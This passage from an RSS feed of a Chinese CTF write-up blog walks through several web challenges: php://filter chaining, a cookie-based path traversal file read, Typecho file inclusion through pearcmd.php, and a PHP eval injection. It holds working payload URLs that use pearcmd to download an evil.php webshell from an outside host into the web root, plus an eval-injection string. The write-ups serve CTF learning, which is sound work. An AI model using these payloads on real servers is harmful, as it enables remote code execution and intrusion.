&lt;p>将p作为过滤器进行注册，161行php_stream_filter_append()应用到文件流上，但显然resource不是流包装器，干不了事，那就再到while循环里接着向后找，直到向后碰到read&lt;/p>
&lt;pre tabindex="0">&lt;code>p=/read=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>进入374行，执行php_stream_apply_filter_list之后就变成了&lt;/p>
&lt;pre tabindex="0">&lt;code>p=convert.base64-decode/resource=/../../../../../1.txt
&lt;/code>&lt;/pre>&lt;p>此时的p=convert.base64-decode，就可以正常的b64解码我们的内容了&lt;/p>
&lt;h3 id="再回头看这个题">再回头看这个题&lt;/h3>
&lt;p>代码很短，限制在于写入的文件内容被b64加密&amp;amp;open_basedir&amp;amp;include已经写好的包装器和一部分固定的内容&lt;/p>
&lt;p>我刚开始卡在了已经写死的包装器的开头还怎么加conver.base64-decode？然后发现是我想多了，可以接着套，底层原理见上，会向后循环取值直到碰到一个正常的流包装器&lt;/p>
&lt;p>第二个问题就是目录穿越了，前面加了5层buff，从结果倒推感觉可以理解，但是自己却没试出来，我的问题&lt;/p>
&lt;p>最后open_basedir的绕过反而是最轻松的，蚁剑插件直接搞&lt;/p>
&lt;p>参考：&lt;a href="https://www.laruence.com/2010/05/04/1450.html">深入理解PHP之require/include顺序&lt;/a> | &lt;a href="https://www.cdxy.me/?p=752">Exploit with PHP Protocols / Wrappers&lt;/a> | &lt;a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">谈一谈php://filter的妙用&lt;/a>&lt;/p>
&lt;h2 id="new_hospital">new_hospital&lt;/h2>
&lt;p>响应cookie会有个API&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023225411779.png" alt="image-20211023225411779">&lt;/p>
&lt;p>将API设为flag.php &lt;code>ZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230544476.png" alt="image-20211023230544476">&lt;/p>
&lt;p>扫目录 得到/old/feature.php 将路径改为这个&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230842820.png" alt="image-20211023230842820">&lt;/p>
&lt;p>将API改为../flag.php &lt;code>Li4vZmxhZy5waHA%3d&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023230912588.png" alt="image-20211023230912588">&lt;/p>
&lt;p>————其实如果先扫目录扫到/old/feature.php的话，可以将API设为./feature.php &lt;code>Li9mZWF0dXJlLnBocA%3d%3d&lt;/code> 读到这一段&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023231112340.png" alt="image-20211023231112340">&lt;/p>
&lt;p>后端的逻辑就是将cookie[&amp;lsquo;api&amp;rsquo;]取出，直接读出内容&lt;/p>
&lt;p>有一点点脑洞，也跟眼力见有关系，我一开始是真没注意到这个cookie的API字段，属实是有点大病；之后做题还是要开环境之后就连burp，注意观察响应头的特殊字段 cookie的类型/ctrl+u的源码/可能会有的控制台的提示信息/robots.txt这些东西，不要遗漏，不然就很可惜了&lt;/p>
&lt;h2 id="give_me_you_0day">Give_me_you_0day&lt;/h2>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023131341209.png" alt="image-20211023131341209">&lt;/p>
&lt;p>这里考察的点并不是Typecho 1.1/17.10.30版本的0day（给出的源码就完全是github上的发行版），而是install.php中 608行存在一个文件包含&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211023233205364.png" alt="image-20211023233205364">&lt;/p>
&lt;p>利用这个文件包含的点来搞，payload可以直接参考&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030247104.png" alt="image-20211024030247104">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024025903697.png" alt="image-20211024025903697">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024030018830.png" alt="image-20211024030018830">&lt;/p>
&lt;p>打的点在于peclcmd，这里涉及到的题和知识害挺多，之前真没见过（dbq是我做的题太少太少了），在这里一并学习了&lt;/p>
&lt;h3 id="关于register_argc_argv配置项">关于&lt;code>register_argc_argv&lt;/code>配置项&lt;/h3>
&lt;p>是php.ini核心配置中的一个选项，默认是这样&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024002824679.png" alt="image-20211024002824679">&lt;/p>
&lt;p>&lt;a href="https://www.php.net/manual/zh/ini.core.php#ini.register-argc-argv">手册&lt;/a>是这样写的&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000219559.png" alt="image-20211024000219559">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000145606.png" alt="image-20211024000145606">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024000543235.png" alt="image-20211024000543235">&lt;/p>
&lt;p>从php=4.0.0后为可设置的选项（此前总为On）默认为开启状态，当php&amp;lt;=4.2.3时可修改范围是&lt;code>PHP_INI_ALL&lt;/code>，更详细的内容可以参见-&amp;gt;&lt;a href="http://ms7.fhsh.tp.edu.tw/php5c/features.commandline.html">PHP的命令行模式&lt;/a>&lt;/p>
&lt;p>在&lt;code>register_argc_argv&lt;/code>开启的情况下，cgi和cli模式下都可以直接访问到传入的参数；其中argc是传递过去的参数的个数，argv是包含有实际参数的数组；cli模式测试如下&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;span style="color:#75715e">// var_dump($HTTP_SERVER_VARS[&amp;#39;argv&amp;#39;]);
&lt;/span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$argv&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003201497.png" alt="image-20211024003201497">&lt;/p>
&lt;p>cgi的话，直接用上面的&lt;code>$_SERVER['argv']&lt;/code>是不会获取到值&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024003801051.png" alt="image-20211024003801051">&lt;/p>
&lt;p>直接查看$_SERVER这个大数组，可以发现我们的参数在这里是以一整个QUERY_STRING的形式出现的（详细的数组解析-&amp;gt;&lt;a href="https://www.feiniaomy.com/post/274.html">PHP超全局变量$_SERVER的用法&lt;/a>）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024012150841.png" alt="image-20211024012150841">&lt;/p>
&lt;p>有个特殊的trick在于，如果是&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1&amp;amp;b=1
&lt;/code>&lt;/pre>&lt;p>确实是两个参数，但返回的$_SERVER[&amp;lsquo;argv&amp;rsquo;]为1，如果是&lt;/p>
&lt;pre tabindex="0">&lt;code>/test.php?a=1+b=1
&lt;/code>&lt;/pre>&lt;p>则会被截断，返回$_SERVER[&amp;lsquo;argv&amp;rsquo;]则为2（说实话我本地真没跑出来这个 可能是哪里的配置有问题？但是看了很多资料，这里应该是可以被复现成功的………………emmmm 有一点点离谱）&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020719209.png" alt="image-20211024020719209">&lt;/p>
&lt;h3 id="关于pear命令">关于&lt;code>pear&lt;/code>命令&lt;/h3>
&lt;p>pear是&lt;em>the PHP Extention and Application Repository&lt;/em>的缩写，是一个PHP扩展与应用的代码仓库，pear仓库代码以包&lt;em>package&lt;/em>分区，每一个&lt;em>pear package&lt;/em>都是一个独立的项目，有自己独立的开发团队、版本控制、文档和其他包的依赖关系信息；&lt;em>pear package&lt;/em>以phar, tar, zip形式发布，通过&lt;code>apt install php-pear&lt;/code>来安装&lt;/p>
&lt;p>pear命令的实现是一个sh脚本&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># first find which PHP binary to use&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$PHP_PEAR_PHP_BIN&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_bin&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>php
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">PHP&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/bin/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#75715e"># then look for the right pear include dir&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> !&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=&lt;/span>&lt;span style="color:#111">$PHP_PEAR_INSTALL_DIR&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">test&lt;/span> &lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>php_dir&lt;span style="color:#d88200">&amp;#39;@&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#00a8c8">then&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">`&lt;/span>dirname &lt;span style="color:#111">$0&lt;/span>&lt;span style="color:#d88200">`&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>
&lt;span style="color:#111">INCDIR&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#111">INCARG&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;-d include_path=/usr/local/lib/php&amp;#34;&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#00a8c8">fi&lt;/span>
&lt;span style="color:#111">exec&lt;/span> &lt;span style="color:#111">$PHP&lt;/span> -C -q &lt;span style="color:#111">$INCARG&lt;/span> -d data.timezone&lt;span style="color:#f92672">=&lt;/span>UTC -d &lt;span style="color:#111">output_buffering&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> -d &lt;span style="color:#111">variables_order&lt;/span>&lt;span style="color:#f92672">=&lt;/span>EGPCS -d &lt;span style="color:#111">open_basedir&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">safe_mode&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span> -d &lt;span style="color:#111">register_argc_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_prepend_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> -d &lt;span style="color:#111">auto_append_file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span> &lt;span style="color:#111">$INCDIR&lt;/span>/pearcmd.php &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">$@&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>从最后一行可以看到调用了/pearcmd.php，而这个pearcmd.php的参数$argv就来源于$_SERVER[&amp;lsquo;argv&amp;rsquo;]，这个是我们可控的传入参数&lt;/p>
&lt;h3 id="利用pear命令执行任意文件下载">利用&lt;code>pear&lt;/code>命令执行任意文件下载&lt;/h3>
&lt;p>如图，直接下载开启了http服务器的目录下的指定文件到当前所在目录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020030648.png" alt="image-20211024020030648">&lt;/p>
&lt;p>使用&lt;code>install -R&lt;/code>而非&lt;code>download&lt;/code>可以控制下载到任意目录，比如直接下载到web服务的目录&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024020411477.png" alt="image-20211024020411477">&lt;/p>
&lt;h3 id="所以总体思路payload">所以总体思路+payload&lt;/h3>
&lt;p>如果存在这样的环境&lt;/p>
&lt;ul>
&lt;li>安装pear&lt;/li>
&lt;li>开启register_argc_argv&lt;/li>
&lt;li>存在可控的传入参数来做到文件包含（比如&lt;code>include $_GET['f'].php&lt;/code>）&lt;/li>
&lt;li>可以出网&lt;/li>
&lt;/ul>
&lt;p>我们就可以做到任意文件下载从而getshell；前面也提到register_argc_argv继续PHP_IN_PREDIR，我们可以留一个.user.ini的后门来设置register_argc_agrv为On&lt;/p>
&lt;p>&lt;strong>payload&lt;/strong>就是这样了&lt;/p>
&lt;pre tabindex="0">&lt;code>// 存在 include $_GET['f'].php
// web目录可写
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/var/www/html+http://ip:port/evil.php
- http://ip:port/tmp/pear/download/evil.php
// tmp目录可写
- http://ip:port/include.php?f=/../../../../../../../../../../usr/local/lib/php/pearcmd&amp;amp;+install+-R+/tmp+http://ip:port/evil.php
- http://ip:port/include.php?f=/tmp/pear/download/evil
&lt;/code>&lt;/pre>&lt;p>首先要包含一个正确位置的pearcmd.php（通常在/usr/local/lib/php/pearcmd.php），接着包含&amp;amp;+download+http://your_vps/eval.php（或者如果前面直接是/pearcmd.php的话就可以直接给参数了/pearcmd.php+download+http://your_vps/eval.php）来装🐎（注意路径是否正确），之后再包含我们的🐎即可&lt;/p>
&lt;h3 id="其它的例题">其它的例题&lt;/h3>
&lt;p>&lt;a href="https://web.archive.org/web/20201022203937/https://khack40.info/camp-ctf-2015-trolol-web-write-up/">[CampCTF 2015] Trolol&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.lemonprefect.cn/zh-tw/posts/9b2fbf24#MeowWorld">[巅峰极客 2020] MeowWord&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">[RCTF 2021] VerySafe&lt;/a>&lt;/p>
&lt;hr>
&lt;p>还是做的题不够多，已有的知识也应用的不够熟练，实在是太太太太太菜了，得好好学，不能天天划水摸鱼&lt;/p></description></item><item><title>DasCTF1021 Wp</title><link>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</link><pubDate>Sun, 24 Oct 2021 16:47:40 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/24/dasctf1021-wp/</guid><description>&lt;h2 id="web迷路的魔法少女">Web/迷路的魔法少女&lt;/h2>
&lt;blockquote>
&lt;p>魔法少女迷失在了代码空间 请寻找她现在在哪&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#75af00">highlight_file&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.php&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">extract&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_GET&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">error_reporting&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#f92672">@&lt;/span>&lt;span style="color:#00a8c8">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">array = &lt;/span>&lt;span style="color:#d88200">$data&lt;/span>&lt;span style="color:#d88200">;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#75af00">is_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;array(&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$attrids&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">count&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#111">;&lt;/span> &lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#f92672">++&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrid&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">])&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;=&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$attrvalue&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$i&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#34;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">$attrids&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;,&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$attrstr&lt;/span> &lt;span style="color:#f92672">.=&lt;/span> &lt;span style="color:#d88200">&amp;#39;);&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#75af00">String2Array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$attrstr&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>/?attrid[]=&amp;amp;attrvalue[]=&amp;quot;);phpinfo();//
&lt;/code>&lt;/pre>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024120107148.png" alt="image-20211024120107148">&lt;/p>
&lt;p>参考：&lt;a href="https://blog.csdn.net/zz_Caleb/article/details/88671071">CG-CTF 变量覆盖(PHP extract函数利用)&lt;/a> | &lt;a href="https://lddp.github.io/2018/11/28/CTF-PHP%E9%BB%91%E9%AD%94%E6%B3%95/">CTF-PHP黑魔法&lt;/a>&lt;/p>
&lt;h2 id="miscwelcome-dasctfxjlenu">Misc/WELCOME DASCTFxJlenu&lt;/h2>
&lt;blockquote>
&lt;p>欢迎来到魔法的世界（签到）&lt;/p>
&lt;/blockquote>
&lt;p>可是有几层包浆的原题了属于是，之前绝对做过一次&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105141498.png" alt="image-20211024105141498">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211024105144295.png" alt="image-20211024105144295">&lt;/p></description></item><item><title>DigitalOverdoseCTF2021 Wp</title><link>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</link><pubDate>Fri, 22 Oct 2021 11:54:15 +0800</pubDate><guid>https://amiaaaz.github.io/2021/10/22/digitaloverdosectf2021-wp/</guid><description>&lt;h2 id="webgit-commit--m-whatever">Web/git commit -m &amp;ldquo;whatever&amp;rdquo;&lt;/h2>
&lt;blockquote>
&lt;p>Visit the website&lt;/p>
&lt;/blockquote>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211009120536593.png" alt="image-20211009120536593">&lt;/p>
&lt;p>emmmm 联系这个题目 访问一下.git看看有没有备份文件泄露&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211019214445911.png" alt="image-20211019214445911">&lt;/p>
&lt;p>用GitHacker下载泄露的git文件，有一个index.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Simple sodium crypto class for PHP &amp;gt;= 7.2
&lt;/span>&lt;span style="color:#d88200"> * @author MRK
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">crypto&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @return type
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">create_encryption_key&lt;/span>&lt;span style="color:#111">()&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">sodium_crypto_secretbox_keygen&lt;/span>&lt;span style="color:#111">());&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#d88200">/**
&lt;/span>&lt;span style="color:#d88200"> * Encrypt a message
&lt;/span>&lt;span style="color:#d88200"> *
&lt;/span>&lt;span style="color:#d88200"> * @param string $message - message to encrypt
&lt;/span>&lt;span style="color:#d88200"> * @param string $key - encryption key created using create_encryption_key()
&lt;/span>&lt;span style="color:#d88200"> * @return string
&lt;/span>&lt;span style="color:#d88200"> */&lt;/span>
&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$message&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#111">$key_decoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">base64_decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$nonce&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">random_bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>
